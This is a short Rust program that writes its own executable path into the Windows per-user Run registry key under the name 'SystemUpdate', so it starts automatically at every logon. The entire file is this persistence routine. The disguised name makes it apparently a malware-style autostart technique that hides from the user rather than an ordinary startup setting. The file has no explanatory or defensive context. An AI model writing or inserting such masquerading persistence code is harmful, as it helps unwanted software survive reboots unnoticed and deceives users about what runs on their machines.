use winreg::enums::*;
use winreg::RegKey;
use std::env;

fn main() {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
    let (key, _) = hkcu.create_subkey(path).unwrap();
    let exe_path = env::current_exe().unwrap();
    key.set_value("SystemUpdate", &exe_path.to_str().unwrap()).unwrap();
}
